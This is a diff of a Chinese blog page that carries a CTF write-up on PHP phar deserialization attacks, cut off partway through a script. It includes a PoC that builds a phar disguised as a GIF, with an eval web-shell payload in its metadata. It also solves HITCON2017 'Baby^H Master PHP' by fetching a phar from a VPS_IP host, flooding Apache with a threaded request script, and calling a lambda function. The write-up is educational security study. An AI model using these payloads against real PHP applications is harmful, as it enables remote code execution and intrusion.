@@ -1,579 +1,571 @@
-
-
 <!DOCTYPE html>
-<html lang="zh-CN" data-default-color-scheme=&#34;dark&#34;>
-
-
-
+<html>
 <head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
-  <link rel="icon" type="image/png" href="/img/favicon.png">
-  <meta name="viewport"
-        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="">
-  <meta name="author" content="osword">
-  <meta name="keywords" content="">
-  <title>PHP反序列化学习之phar攻击 - osword&#39;s blog</title>
+    
 
-  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+    
+
+    
 
 
-  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
-  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
 
-  
+    <meta charset="utf-8">
     
     
-      
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/darcula.min.css" />
     
-  
+    
+    <title>PHP反序列化学习之phar攻击 | osword&#39;s blog | 小刀</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="PHP反序列化">
+    <meta name="description" content="概述这周准备抓一抓PHP序列化相关的知识,所以有了下面这些东西. Phar定义简单来说phar就是php压缩文档。它可以把多个文件归档到同一个文件中，而且不经过解压就能被 php 访问并执行，与file:&#x2F;&#x2F; php:&#x2F;&#x2F;等类似，也是一种流包装器。phar结构由 4 部分组成  stub phar 文件标识，格式为 xxx；manifest 压缩文件的属性等信息，以序列化存储；contents 压">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP反序列化学习之phar攻击">
+<meta property="og:url" content="http://zhzhdoai.github.io/2019/05/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B9%8Bphar%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="osword&#39;s blog">
+<meta property="og:description" content="概述这周准备抓一抓PHP序列化相关的知识,所以有了下面这些东西. Phar定义简单来说phar就是php压缩文档。它可以把多个文件归档到同一个文件中，而且不经过解压就能被 php 访问并执行，与file:&#x2F;&#x2F; php:&#x2F;&#x2F;等类似，也是一种流包装器。phar结构由 4 部分组成  stub phar 文件标识，格式为 xxx；manifest 压缩文件的属性等信息，以序列化存储；contents 压">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://zhzhdoai.github.io/2019/05/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B9%8Bphar%E6%94%BB%E5%87%BB/1.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2019/05/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B9%8Bphar%E6%94%BB%E5%87%BB/1.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2019/05/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B9%8Bphar%E6%94%BB%E5%87%BB/2.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2019/05/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B9%8Bphar%E6%94%BB%E5%87%BB/3.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2019/05/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B9%8Bphar%E6%94%BB%E5%87%BB/4.png">
+<meta property="article:published_time" content="2019-05-22T12:57:45.000Z">
+<meta property="article:modified_time" content="2020-05-15T08:31:42.000Z">
+<meta property="article:author" content="osword">
+<meta property="article:tag" content="PHP反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://zhzhdoai.github.io/2019/05/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B9%8Bphar%E6%94%BB%E5%87%BB/1.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="osword&#39;s blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
 
-  
+    <!-- custom head -->
+    
 
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-<!-- 自定义样式保持在最底部 -->
-
-
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
 <meta name="generator" content="Hexo 4.2.1"></head>
 
-
 <body>
-  <header style="height: 70vh;">
-    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand"
-       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+    <div id="loading" class="active"></div>
 
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">osword</h5>
+          <a href="mailto:929337105@qq.com" title="929337105@qq.com" class="mail">929337105@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
         
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                首页
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
               </a>
             </li>
-          
         
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                归档
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
               </a>
             </li>
-          
         
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/">
-                <i class="iconfont icon-category-fill"></i>
-                分类
+            <li class="waves-block waves-effect">
+              <a href="https://zhzhdoai.github.io/"  >
+                <i class="icon icon-lg icon-友链"></i>
+                友链
               </a>
             </li>
-          
         
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/">
-                <i class="iconfont icon-tags-fill"></i>
-                标签
+            <li class="waves-block waves-effect">
+              <a href="https://glotozz.github.io/" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-glotozz"></i>
+                Glotozz
               </a>
             </li>
-          
         
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                关于
+            <li class="waves-block waves-effect">
+              <a href="https://nikoeurus.github.io/" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-sommus"></i>
+                Sommus
               </a>
             </li>
-          
         
+            <li class="waves-block waves-effect">
+              <a href="https://mochazz.github.io/" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-mochazz@七月火"></i>
+                Mochazz 七月火
+              </a>
+            </li>
         
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
-                class="iconfont icon-search"></i>&nbsp;</a>
-          </li>
+            <li class="waves-block waves-effect">
+              <a href="https://tea9.xyz/" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-tea9"></i>
+                Tea 9
+              </a>
+            </li>
         
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" href="javascript:">&nbsp;<i
-                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
-          </li>
+            <li class="waves-block waves-effect">
+              <a href="https://wulidecade.cn/" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-Decade"></i>
+                Decade
+              </a>
+            </li>
         
       </ul>
     </div>
   </div>
-</nav>
+</aside>
 
-    <div class="banner intro-2" id="background" parallax=true
-         style="background: url('/img/default.png') no-repeat center center;
-           background-size: cover;">
-      <div class="full-bg-img">
-        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-          <div class="container page-header text-center fade-in-up">
-            <span class="h2" id="subtitle">
-              
-            </span>
-
-            
-              <div class="mt-3">
-  
-  
-    <span class="post-meta">
-      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2019-05-22 20:57" pubdate>
-        2019年5月22日 晚上
-      </time>
-    </span>
-  
-</div>
-
-<div class="mt-1">
-  
-    
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-chart"></i>
-      1k 字
-    </span>
-  
-
-  
-    
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-clock-fill"></i>
-      
-      
-      13
-       分钟
-    </span>
-  
-
-  
-  
-    
-      <!-- 不蒜子统计文章PV -->
-      <span id="busuanzi_container_page_pv" style="display: none">
-        <i class="iconfont icon-eye" aria-hidden="true"></i>
-        <span id="busuanzi_value_page_pv"></span> 次
-      </span>
-    
-  
-</div>
-
-            
-          </div>
-
-          
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">PHP反序列化学习之phar攻击</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
         </div>
-      </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
     </div>
-  </header>
+</header>
+<header class="content-header post-header">
 
-  <main>
-    
-      
-
-<div class="container-fluid">
-  <div class="row">
-    <div class="d-none d-lg-block col-lg-2"></div>
-    <div class="col-lg-8 nopadding-md">
-      <div class="container nopadding-md" id="board-ctn">
-        <div class="py-5" id="board">
-          <article class="post-content mx-auto" id="post">
-            <!-- SEO header -->
-            <h1 style="display: none">PHP反序列化学习之phar攻击</h1>
+    <div class="container fade-scale">
+        <h1 class="title">PHP反序列化学习之phar攻击</h1>
+        <h5 class="subtitle">
             
-            <div class="markdown-body" id="post-body">
-              <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>这周准备抓一抓PHP序列化相关的知识,所以有了下面这些东西.</p>
+                <time datetime="2019-05-22T12:57:45.000Z" itemprop="datePublished" class="page-time">
+  2019-05-22
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#概述"><span class="post-toc-number">1.</span> <span class="post-toc-text">概述</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Phar定义"><span class="post-toc-number">2.</span> <span class="post-toc-text">Phar定义</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#CTF-1"><span class="post-toc-number">3.</span> <span class="post-toc-text">CTF_1</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#CTF-2"><span class="post-toc-number">4.</span> <span class="post-toc-text">CTF_2</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#HITCON2017-Baby-H-Master-PHP-2017"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">HITCON2017 Baby^H Master PHP 2017</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#多线程请求"><span class="post-toc-number">5.</span> <span class="post-toc-text">多线程请求</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#参考链接"><span class="post-toc-number">6.</span> <span class="post-toc-text">参考链接</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-PHP反序列化学习之phar攻击"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">PHP反序列化学习之phar攻击</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-05-22 20:57:45" datetime="2019-05-22T12:57:45.000Z"  itemprop="datePublished">2019-05-22</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>这周准备抓一抓PHP序列化相关的知识,所以有了下面这些东西.</p>
 <h1 id="Phar定义"><a href="#Phar定义" class="headerlink" title="Phar定义"></a>Phar定义</h1><p>简单来说phar就是php压缩文档。它可以把多个文件归档到同一个文件中，而且不经过解压就能被 php 访问并执行，与<code>file:// php://</code>等类似，也是一种流包装器。<br>phar结构由 4 部分组成</p>
 <blockquote>
 <p>stub phar 文件标识，格式为 xxx<?php xxx; __HALT_COMPILER();?>；<br>manifest 压缩文件的属性等信息，以<strong>序列化</strong>存储；<br>contents 压缩文件的内容；<br>signature 签名，放在文件末尾；</p>
 </blockquote>
 <p>这里有两个关键点，一是文件标识，必须以<code>__HALT_COMPILER();?&gt;</code>结尾，但前面的内容没有限制，也就是说我们可以轻易伪造一个图片文件或者pdf文件来绕过一些上传限制；二是反序列化，phar存储的meta-data信息以序列化方式存储，当文件操作函数通过<code>phar://</code>伪协议解析phar文件时就会将数据反序列化，而这样的文件操作函数有很多，包括下面这些：</p>
-<p><img src="./1.png" srcset="/img/loading.gif" alt=""></p>
-<h1 id="CTF-1"><a href="#CTF-1" class="headerlink" title="CTF_1"></a>CTF_1</h1><p><img src="./1.png" srcset="/img/loading.gif" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./1.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="CTF-1"><a href="#CTF-1" class="headerlink" title="CTF_1"></a>CTF_1</h1><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./1.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p><code>Phar://</code>协议流只要出现phar标识头就会解析，所以我们可以直接改成gif格式文件<br>根据上述poc创建出poc1.gif上传后，通过<code>file_exists</code>触发文件反序列化</p>
-<pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span>
-<span class="php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Myclass</span></span>&#123;</span>
-<span class="php">    <span class="hljs-keyword">var</span>  $output=<span class="hljs-string">'@eval($_GET["a"]);'</span>;</span>
-<span class="php">    </span>
-<span class="php">&#125;</span>
-<span class="php">$o=<span class="hljs-keyword">new</span> Myclass();</span>
-<span class="php">$filename=<span class="hljs-string">'poc1.phar'</span>;<span class="hljs-comment">//1.后缀必须为phar</span></span>
-<span class="php">file_exists($filename)?@unlink($filename):<span class="hljs-keyword">null</span>;</span>
-<span class="php">$phar=<span class="hljs-keyword">new</span> Phar($filename);</span>
-<span class="php">$phar-&gt;startBuffering();</span>
-<span class="php">$phar-&gt;setStub(<span class="hljs-string">"GIF89a&lt;?php __HALT_COMPILER(); ?&gt;"</span>);<span class="hljs-comment">//2.phar 文件标识</span></span>
-<span class="php">$phar-&gt;setMetadata($o);<span class="hljs-comment">//3.压缩文件的属性等信息</span></span>
-<span class="php">$phar-&gt;addFromString(<span class="hljs-string">"foo.txt"</span>,<span class="hljs-string">"bar"</span>);<span class="hljs-comment">//4.压缩文件的内容</span></span>
-<span class="php">$phar-&gt;stopBuffering();<span class="hljs-comment">//5.签名</span></span>
-<span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Myclass&#123;</span><br><span class="line">    var  $output&#x3D;&#39;@eval($_GET[&quot;a&quot;]);&#39;;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">$o&#x3D;new Myclass();</span><br><span class="line">$filename&#x3D;&#39;poc1.phar&#39;;&#x2F;&#x2F;1.后缀必须为phar</span><br><span class="line">file_exists($filename)?@unlink($filename):null;</span><br><span class="line">$phar&#x3D;new Phar($filename);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;);&#x2F;&#x2F;2.phar 文件标识</span><br><span class="line">$phar-&gt;setMetadata($o);&#x2F;&#x2F;3.压缩文件的属性等信息</span><br><span class="line">$phar-&gt;addFromString(&quot;foo.txt&quot;,&quot;bar&quot;);&#x2F;&#x2F;4.压缩文件的内容</span><br><span class="line">$phar-&gt;stopBuffering();&#x2F;&#x2F;5.签名</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 
-<p><code>127.0.0.1/phar/file.php?filename=phar://poc1.gif&amp;a=phpinfo();</code><br><img src="./2.png" srcset="/img/loading.gif" alt=""></p>
-<h1 id="CTF-2"><a href="#CTF-2" class="headerlink" title="CTF_2"></a>CTF_2</h1><h2 id="HITCON2017-Baby-H-Master-PHP-2017"><a href="#HITCON2017-Baby-H-Master-PHP-2017" class="headerlink" title="HITCON2017 Baby^H Master PHP 2017"></a>HITCON2017 Baby^H Master PHP 2017</h2><p><img src="./3.png" srcset="/img/loading.gif" alt=""></p>
+<p><code>127.0.0.1/phar/file.php?filename=phar://poc1.gif&amp;a=phpinfo();</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./2.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="CTF-2"><a href="#CTF-2" class="headerlink" title="CTF_2"></a>CTF_2</h1><h2 id="HITCON2017-Baby-H-Master-PHP-2017"><a href="#HITCON2017-Baby-H-Master-PHP-2017" class="headerlink" title="HITCON2017 Baby^H Master PHP 2017"></a>HITCON2017 Baby^H Master PHP 2017</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./3.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>代码<strong>第40行</strong>进行反序列化，回溯到<strong>第9行</strong>是对<code>user</code>类进行反序列化。<br>通读代码可知需要构造反序列化Admin类触发<code>__destruct</code>，执行<code>create_function</code>创建匿名函数，通过<code>$_GET[‘lucky’]()</code>执行匿名函数得到Flag.</p>
 <p><code>$data</code>通过<code>cookie</code>传入，可控。但是在<code>check_session()</code>方法对<code>$data</code>进行hash验证。很显然我们得不到<code>secret</code>。</p>
-<p><img src="./4.png" srcset="/img/loading.gif" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./4.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>看来伪照<code>$data</code>无果，看到<code>upload()</code>方法有<code>file_get_contents</code>方法，由文章开头可知该方法可以触发phar反序列化。<br>我们可以通过<code>$_GET[‘url’]</code>借助<code>vps</code>上传<code>avatar.gif</code>，Poc构造如下</p>
-<pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span>
-
-<span class="php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123; </span>
-<span class="php">    <span class="hljs-keyword">public</span> $avatar; </span>
-<span class="php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($path)</span> </span>&#123; </span>
-<span class="php">        <span class="hljs-keyword">$this</span>-&gt;avatar = <span class="hljs-string">'随便填'</span>; </span>
-<span class="php">    &#125; </span>
-<span class="php">&#125; </span>
-
-<span class="php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Admin</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">User</span> </span>&#123; </span>
-
-<span class="php">&#125; </span>
-<span class="php">$o=<span class="hljs-keyword">new</span> Admin();</span>
-<span class="php">$filename=<span class="hljs-string">'poc1.phar'</span>;<span class="hljs-comment">//1.后缀必须为phar</span></span>
-<span class="php">file_exists($filename)?@unlink($filename):<span class="hljs-keyword">null</span>;</span>
-<span class="php">$phar=<span class="hljs-keyword">new</span> Phar($filename);</span>
-<span class="php">$phar-&gt;startBuffering();</span>
-<span class="php">$phar-&gt;setStub(<span class="hljs-string">"GIF89a&lt;?php __HALT_COMPILER(); ?&gt;"</span>);<span class="hljs-comment">//2.phar 文件标识</span></span>
-<span class="php">$phar-&gt;setMetadata($o);<span class="hljs-comment">//3.压缩文件的属性等信息</span></span>
-<span class="php">$phar-&gt;addFromString(<span class="hljs-string">"foo.txt"</span>,<span class="hljs-string">"bar"</span>);<span class="hljs-comment">//4.压缩文件的内容</span></span>
-<span class="php">$phar-&gt;stopBuffering();<span class="hljs-comment">//5.签名</span></span>
-<span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class User &#123; </span><br><span class="line">    public $avatar; </span><br><span class="line">    function __construct($path) &#123; </span><br><span class="line">        $this-&gt;avatar &#x3D; &#39;随便填&#39;; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">class Admin extends User &#123; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line">$o&#x3D;new Admin();</span><br><span class="line">$filename&#x3D;&#39;poc1.phar&#39;;&#x2F;&#x2F;1.后缀必须为phar</span><br><span class="line">file_exists($filename)?@unlink($filename):null;</span><br><span class="line">$phar&#x3D;new Phar($filename);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;);&#x2F;&#x2F;2.phar 文件标识</span><br><span class="line">$phar-&gt;setMetadata($o);&#x2F;&#x2F;3.压缩文件的属性等信息</span><br><span class="line">$phar-&gt;addFromString(&quot;foo.txt&quot;,&quot;bar&quot;);&#x2F;&#x2F;4.压缩文件的内容</span><br><span class="line">$phar-&gt;stopBuffering();&#x2F;&#x2F;5.签名</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 <p>接下来就是执行怎样通过<code>$_GET[‘lucky’]</code>执行匿名函数问题。</p>
 <p>源码分析匿名函数具体见我一篇文章：create_function任意代码执行</p>
 <p>那么怎样才能得到匿名函数名，可以参考： <code>Apache的三种MPM模式比较：prefork，worker，event</code>。当用户请求过大时，超过 apache 默认设定的阀值时，就会启动新的线程来处理请求，此时在新的线程中，匿名函数的名字又会从1开始递增，这样我们就容易猜测匿名函数的名字了。</p>
 <p>将生成的 <strong>poc1.phar</strong> 放在自己的 <strong>VPS</strong> 上并重命名成 <strong>avatar.gif</strong>，然后将文件上传到题目服务器上：</p>
-<pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>题目IP<span class="hljs-regexp">/index.php?m=upload&amp;url=http:/</span><span class="hljs-regexp">/VPS_IP/</span></code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;题目IP&#x2F;index.php?m&#x3D;upload&amp;url&#x3D;http:&#x2F;&#x2F;VPS_IP&#x2F;</span><br></pre></td></tr></table></figure>
 
 <p>接着，我们需要通过大量请求，使 <strong>apache</strong> 重新开启一个新的线程，然后访问如下 <strong>url</strong> 即可完成反序列化并获得 <strong>flag</strong> ：</p>
-<pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>题目IP<span class="hljs-regexp">/index.php?m=upload&amp;url=phar:/</span><span class="hljs-regexp">//</span>var<span class="hljs-regexp">/www/</span>data<span class="hljs-regexp">/$SANDBOX/</span>&amp;lucky=%<span class="hljs-number">00</span>lambda_</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;题目IP&#x2F;index.php?m&#x3D;upload&amp;url&#x3D;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;data&#x2F;$SANDBOX&#x2F;&amp;lucky&#x3D;%00lambda_</span><br></pre></td></tr></table></figure>
 
-<h1 id="多线程请求"><a href="#多线程请求" class="headerlink" title="多线程请求"></a>多线程请求</h1><pre><code class="hljs routeros"><span class="hljs-comment"># coding: UTF-8</span>
-<span class="hljs-comment"># Author: orange@chroot.org</span>
-<span class="hljs-comment"># </span>
-
-import requests
-import socket
-import time
-<span class="hljs-keyword">from</span> multiprocessing.dummy import<span class="hljs-built_in"> Pool </span>as ThreadPool
-try:
-    requests.packages.urllib3.disable_warnings()
-except:
-    pass
-
-def <span class="hljs-builtin-name">run</span>(i):
-    <span class="hljs-keyword">while</span> 1:
-        HOST = <span class="hljs-string">'127.0.0.1'</span>
-       <span class="hljs-built_in"> PORT </span>= 80
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((HOST, PORT))
-        s.sendall(<span class="hljs-string">'GET / HTTP/1.1\nHost: 54.238.212.199\nConnection: Keep-Alive\n\n'</span>)
-        # s.close()
-        <span class="hljs-builtin-name">print</span> <span class="hljs-string">'ok'</span>
-        time.sleep(0.5)
-
-i = 8
-pool = ThreadPool( i )
-result = pool.map_async( run, range(i) ).<span class="hljs-builtin-name">get</span>(0xffff)</code></pre>
+<h1 id="多线程请求"><a href="#多线程请求" class="headerlink" title="多线程请求"></a>多线程请求</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># coding: UTF-8</span><br><span class="line"># Author: orange@chroot.org</span><br><span class="line"># </span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import socket</span><br><span class="line">import time</span><br><span class="line">from multiprocessing.dummy import Pool as ThreadPool</span><br><span class="line">try:</span><br><span class="line">    requests.packages.urllib3.disable_warnings()</span><br><span class="line">except:</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def run(i):</span><br><span class="line">    while 1:</span><br><span class="line">        HOST &#x3D; &#39;127.0.0.1&#39;</span><br><span class="line">        PORT &#x3D; 80</span><br><span class="line">        s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((HOST, PORT))</span><br><span class="line">        s.sendall(&#39;GET &#x2F; HTTP&#x2F;1.1\nHost: 54.238.212.199\nConnection: Keep-Alive\n\n&#39;)</span><br><span class="line">        # s.close()</span><br><span class="line">        print &#39;ok&#39;</span><br><span class="line">        time.sleep(0.5)</span><br><span 